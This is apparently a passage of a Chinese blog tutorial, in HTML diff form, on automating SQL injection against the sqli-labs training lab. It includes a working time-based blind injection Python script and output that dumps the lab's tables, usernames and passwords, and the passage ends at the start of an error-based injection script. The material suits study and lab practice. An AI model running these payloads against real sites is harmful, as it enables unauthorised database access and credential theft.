+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>下面是脚本运行得到的数据</p>
-<p>&lt;!–code￼2–&gt;
+<pre class="line-numbers language-none"><code class="language-none">开始测试数据库名长度
+数据库长度为：8
+开始测试数据库名长度
+数据库长度为：8
+字符为：s
+当前数据库名：s
+字符为：e
+当前数据库名：se
+字符为：c
+当前数据库名：sec
+字符为：u
+当前数据库名：secu
+字符为：r
+当前数据库名：secur
+字符为：i
+当前数据库名：securi
+字符为：t
+当前数据库名：securit
+字符为：y
+当前数据库名：security
+开始测试security数据库中有几张表.....
+security数据库总共有4张表
+开始猜解表名.....
+第1张表名的长度为：6
+当前表名: e
+当前表名: em
+当前表名: ema
+当前表名: emai
+当前表名: email
+当前表名: emails
+完成第1张表: emails
+第2张表名的长度为：8
+当前表名: r
+当前表名: re
+当前表名: ref
+当前表名: refe
+当前表名: refer
+当前表名: refere
+当前表名: referer
+当前表名: referers
+完成第2张表: referers
+第3张表名的长度为：7
+当前表名: u
+当前表名: ua
+当前表名: uag
+当前表名: uage
+当前表名: uagen
+当前表名: uagent
+当前表名: uagents
+完成第3张表: uagents
+第4张表名的长度为：5
+当前表名: u
+当前表名: us
+当前表名: use
+当前表名: user
+当前表名: users
+完成第4张表: users
 
-</p>
+security库下的4张表：[&#39;emails&#39;, &#39;referers&#39;, &#39;uagents&#39;, &#39;users&#39;]
+
+开始猜解每张表的字段数.....
+[+] emails表有2个字段
+[+] referers表有3个字段
+[+] uagents表有4个字段
+[+] users表有11个字段
+
+各表字段数：[2, 3, 4, 11]
+
+开始猜解每张表的字段名.....
+
+emails表的字段：
+id
+email_id
+
+referers表的字段：
+id
+referer
+ip_address
+
+uagents表的字段：
+id
+uagent
+ip_address
+username
+
+users表的字段：
+id
+name
+username
+password
+type
+USER
+CURRENT_CONNECTIONS
+TOTAL_CONNECTIONS
+id
+username
+password
+开始导出security库的数据...
+
+emails表的数据：
+共有8条记录
+第1条: [&#39;1&#39;, &#39;Dumb@dhakkan.com&#39;]
+第2条: [&#39;2&#39;, &#39;Angel@iloveu.com&#39;]
+第3条: [&#39;3&#39;, &#39;Dummy@dhakkan.local&#39;]
+第4条: [&#39;4&#39;, &#39;secure@dhakkan.local&#39;]
+第5条: [&#39;5&#39;, &#39;stupid@dhakkan.local&#39;]
+第6条: [&#39;6&#39;, &#39;superman@dhakkan.local&#39;]
+第7条: [&#39;7&#39;, &#39;batman@dhakkan.local&#39;]
+第8条: [&#39;8&#39;, &#39;admin@dhakkan.com&#39;]
+
+referers表的数据：
+共有0条记录
+
+uagents表的数据：
+共有0条记录
+
+users表的数据：
+共有13条记录
+第1条: [&#39;1&#39;, &#39;Dumb&#39;, &#39;Dumb&#39;, &#39;1&#39;, &#39;Dumb&#39;, &#39;Dumb&#39;]
+第2条: [&#39;2&#39;, &#39;Angelina&#39;, &#39;I-kill-you&#39;, &#39;2&#39;, &#39;Angelina&#39;, &#39;I-kill-you&#39;]
+第3条: [&#39;3&#39;, &#39;Dummy&#39;, &#39;p@ssword&#39;, &#39;3&#39;, &#39;Dummy&#39;, &#39;p@ssword&#39;]
+第4条: [&#39;4&#39;, &#39;secure&#39;, &#39;crappy&#39;, &#39;4&#39;, &#39;secure&#39;, &#39;crappy&#39;]
+第5条: [&#39;5&#39;, &#39;stupid&#39;, &#39;stupidity&#39;, &#39;5&#39;, &#39;stupid&#39;, &#39;stupidity&#39;]
+第6条: [&#39;6&#39;, &#39;superman&#39;, &#39;genious&#39;, &#39;6&#39;, &#39;superman&#39;, &#39;genious&#39;]
+第7条: [&#39;7&#39;, &#39;batman&#39;, &#39;mob!le&#39;, &#39;7&#39;, &#39;batman&#39;, &#39;mob!le&#39;]
+第8条: [&#39;8&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;8&#39;, &#39;admin&#39;, &#39;admin&#39;]
+第9条: [&#39;9&#39;, &#39;admin1&#39;, &#39;admin1&#39;, &#39;9&#39;, &#39;admin1&#39;, &#39;admin1&#39;]
+第10条: [&#39;10&#39;, &#39;admin2&#39;, &#39;admin2&#39;, &#39;10&#39;, &#39;admin2&#39;, &#39;admin2&#39;]
+第11条: [&#39;11&#39;, &#39;admin3&#39;, &#39;admin3&#39;, &#39;11&#39;, &#39;admin3&#39;, &#39;admin3&#39;]
+第12条: [&#39;12&#39;, &#39;dhakkan&#39;, &#39;dumbo&#39;, &#39;12&#39;, &#39;dhakkan&#39;, &#39;dumbo&#39;]
+第13条: [&#39;14&#39;, &#39;admin4&#39;, &#39;admin4&#39;, &#39;14&#39;, &#39;admin4&#39;, &#39;admin4&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h1><p>下面是一个比较我认为比较简洁的时间盲注的脚本，本可以根据布尔盲注的脚本简单更改的，但是这种脚本也值得学习，借鉴</p>
-<p>&lt;!–code￼3–&gt;
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> datetime
 
-</p>
+url <span class="token operator">=</span> <span class="token string">'http://sql/sqli-labs/Less-10/'</span>
+
+<span class="token keyword">def</span> <span class="token function">database_len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#获取数据库名称长度</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" and if(length(database())=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(3),0)--+'</span></span>
+        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+        <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据库长度:'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> i
+    <span class="token keyword">return</span> <span class="token number">0</span>
+
+<span class="token keyword">def</span> <span class="token function">database_name</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#获取数据库名称</span>
+    name <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        found <span class="token operator">=</span> <span class="token boolean">False</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 遍历所有可打印ASCII字符</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" and if(ascii(substr(database(),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(3),0)--+'</span></span>
+            time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+            <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+                name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前数据库名:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+                found <span class="token operator">=</span> <span class="token boolean">True</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'最终数据库名:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> name
+
+<span class="token keyword">def</span> <span class="token function">table_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#获取所有表名</span>
+    tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        name <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            found <span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(3),0)--+'</span></span>
+                time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+                <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+                    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                    found <span class="token operator">=</span> <span class="token boolean">True</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">if</span> name<span class="token punctuation">:</span>
+            tables<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"发现表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">:"</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> tables
+
+<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#获取指定表的所有列名</span>
+    columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        name <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            found <span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" and if(ascii(substr((select distinct column_name from information_schema.columns where table_name="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">" and table_schema=database() limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(3),0)--+'</span></span>
+                time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+                <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+                    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                    found <span class="token operator">=</span> <span class="token boolean">True</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">if</span> name <span class="token keyword">and</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> columns<span class="token punctuation">:</span>  <span class="token comment">#检验列名是否为真，并且是否不存在与columns列表中，避免重复添加相同的列名</span>
+            columns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> 的列 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">:"</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> columns
+
+<span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#获取指定表的数据</span>
+    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        name <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            found <span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" and if(ascii(substr((select </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column<span class="token punctuation">&#125;</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(3),0)--+'</span></span>
+                time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+                time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
+                <span class="token keyword">if</span> sec <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+                    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+                    found <span class="token operator">=</span> <span class="token boolean">True</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">if</span> name<span class="token punctuation">:</span>
+            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 的 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column<span class="token punctuation">&#125;</span></span><span class="token string"> 数据 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">:"</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> results
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始SQL盲注测试..."</span><span class="token punctuation">)</span>
+    length <span class="token operator">=</span> database_len<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+        db_name <span class="token operator">=</span> database_name<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+        tables <span class="token operator">=</span> table_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> tables<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> table <span class="token keyword">in</span> tables<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n正在获取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 的列信息..."</span></span><span class="token punctuation">)</span>
+                columns <span class="token operator">=</span> column_name<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> columns<span class="token punctuation">:</span>
+                    <span class="token keyword">for</span> column <span class="token keyword">in</span> columns<span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n正在获取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 的列 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column<span class="token punctuation">&#125;</span></span><span class="token string"> 的数据..."</span></span><span class="token punctuation">)</span>
+                        data<span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
+    <span class="token comment"># 最后这一段能够体现出对函数的逐层调用的过程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>下面是脚本运行的结果</p>
-<p>&lt;!–code￼4–&gt;
+<pre class="line-numbers language-none"><code class="language-none">开始SQL盲注测试...
+数据库长度: 8
+当前数据库名: s
+当前数据库名: se
+当前数据库名: sec
+当前数据库名: secu
+当前数据库名: secur
+当前数据库名: securi
+当前数据库名: securit
+当前数据库名: security
+最终数据库名: security
+发现表 1: emails
+发现表 2: referers
+发现表 3: uagents
+发现表 4: users
 
-</p>
-<h1 id="报错注入脚本"><a href="#报错注入脚本" class="headerlink" title="报错注入脚本"></a>报错注入脚本</h1><p>&lt;!–code￼5–&gt;
+正在获取表 emails 的列信息...
+表 emails 的列 1: id
+表 emails 的列 2: email_id
 
-</p>
+正在获取表 emails 的列 id 的数据...
+表 emails 的 id 数据 1: 1
+表 emails 的 id 数据 2: 2
+表 emails 的 id 数据 3: 3
+表 emails 的 id 数据 4: 4
+表 emails 的 id 数据 5: 5
+表 emails 的 id 数据 6: 6
+表 emails 的 id 数据 7: 7
+表 emails 的 id 数据 8: 8
+
+正在获取表 emails 的列 email_id 的数据...
+表 emails 的 email_id 数据 1: Dumb@dhakkan.com
+表 emails 的 email_id 数据 2: Angel@iloveu.com
+表 emails 的 email_id 数据 3: Dummy@dhakkan.local
+表 emails 的 email_id 数据 4: secure@dhakkan.local
+表 emails 的 email_id 数据 5: stupid@dhakkan.local
+表 emails 的 email_id 数据 6: superman@dhakkan.local
+表 emails 的 email_id 数据 7: batman@dhakkan.local
+表 emails 的 email_id 数据 8: admin@dhakkan.com
+
+正在获取表 referers 的列信息...
+表 referers 的列 1: id
+表 referers 的列 2: referer
+表 referers 的列 3: ip_address
+
+正在获取表 referers 的列 id 的数据...
+
+正在获取表 referers 的列 referer 的数据...
+
+正在获取表 referers 的列 ip_address 的数据...
+
+正在获取表 uagents 的列信息...
+表 uagents 的列 1: id
+表 uagents 的列 2: uagent
+表 uagents 的列 3: ip_address
+表 uagents 的列 4: username
+
+正在获取表 uagents 的列 id 的数据...
+
+正在获取表 uagents 的列 uagent 的数据...
+
+正在获取表 uagents 的列 ip_address 的数据...
+
+正在获取表 uagents 的列 username 的数据...
+
+正在获取表 users 的列信息...
+表 users 的列 1: id
+表 users 的列 2: username
+表 users 的列 3: password
+
+正在获取表 users 的列 id 的数据...
+表 users 的 id 数据 1: 1
+表 users 的 id 数据 2: 2
+表 users 的 id 数据 3: 3
+表 users 的 id 数据 4: 4
+表 users 的 id 数据 5: 5
+表 users 的 id 数据 6: 6
+表 users 的 id 数据 7: 7
+表 users 的 id 数据 8: 8
+表 users 的 id 数据 9: 9
+表 users 的 id 数据 10: 10
+
+正在获取表 users 的列 username 的数据...
+表 users 的 username 数据 1: Dumb
+表 users 的 username 数据 2: Angelina
+表 users 的 username 数据 3: Dummy
+表 users 的 username 数据 4: secure
+表 users 的 username 数据 5: stupid
+表 users 的 username 数据 6: superman
+表 users 的 username 数据 7: batman
+表 users 的 username 数据 8: admin
+表 users 的 username 数据 9: admin1
+表 users 的 username 数据 10: admin2
+
+正在获取表 users 的列 password 的数据...
+表 users 的 password 数据 1: Dumb
+表 users 的 password 数据 2: I-kill-you
+表 users 的 password 数据 3: p@ssword
+表 users 的 password 数据 4: crappy
+
+表 users 的 password 数据 5: stupidity
+表 users 的 password 数据 6: genious
+表 users 的 password 数据 7: mob!le
+表 users 的 password 数据 8: admin
+表 users 的 password 数据 9: admin1
+表 users 的 password 数据 10: admin2
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="报错注入脚本"><a href="#报错注入脚本" class="headerlink" title="报错注入脚本"></a>报错注入脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+
+<span class="token keyword">class</span> <span class="token class-name">SQLiExplorer</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 初始化类</span>
+        self<span class="token punctuation">.</span>databases <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储数据库名</span>
+        self<span class="token punctuation">.</span>tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储表名</span>
